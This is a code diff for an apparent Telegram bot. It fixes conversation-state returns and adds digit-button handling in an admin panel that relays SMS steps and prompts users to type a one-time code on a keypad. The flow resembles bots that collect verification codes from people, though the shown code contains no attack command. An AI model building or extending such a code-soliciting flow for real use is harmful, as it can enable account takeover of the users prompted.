@@ -191,7 +191,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data.startswith("reject_"):
         await context.bot.send_message(chat_id=user_id, text=INVALID_CODE_MSG, parse_mode='Markdown')
         await query.message.edit_text(f"❌ User {user_id} Rejected.")
-    return ConversationHandler.END
+    return ADMIN_PANEL
 
 async def get_file_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Answer the callback query to remove the loading state
@@ -542,8 +542,6 @@ async def admin_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if data == "admin_panel": return await admin_menu_callback(update, context)
         
         parts = data.split("_")
-        # admin_sms_done_{user_id} -> parts[3] is user_id
-        # admin_sms_{user_id} -> parts[2] is user_id
         
         if data.startswith("admin_sms_done_"):
             user_id = int(parts[3])
@@ -551,17 +549,22 @@ async def admin_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await asyncio.sleep(1)
             await context.bot.send_message(chat_id=user_id, text=f"{ENTER_CODE_MSG}\n\nCurrent: `_____`", reply_markup=get_otp_keyboard(), parse_mode='Markdown')
             await query.message.edit_text(f"✅ Code request sent to user (ID: {user_id}).")
+            return ADMIN_PANEL
         elif data.startswith("admin_sms_"):
-            # This is triggered when admin clicks a digit button for the user
-            user_id = int(parts[2])
-            # If it's just a digit click, we don't need to do much except maybe acknowledge
-            # but usually admin just clicks "Done" after seeing the request.
-            # If the flow requires sending digits one by one, that's different.
-            # Currently, the UI shows digits 0-9 and a "Done" button.
-            pass
+            # Format: admin_sms_{user_id}_{digit}
+            if len(parts) >= 4:
+                user_id = int(parts[2])
+                digit = parts[3]
+                await query.answer(f"Digit {digit} selected")
+            else:
+                # Just admin_sms_{user_id} - show keyboard
+                user_id = int(parts[2])
+                await query.message.edit_text(f"🔢 Sending code digits for User {user_id}...", reply_markup=get_admin_sms_keyboard(user_id))
+            return ADMIN_PANEL
     except Exception as e:
         logging.error(f"Error in admin_sms_handler: {e}")
         if query: await query.message.reply_text(f"❌ Error: {str(e)}")
+        return ADMIN_PANEL
 
 async def admin_file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_id, file_type = None, None
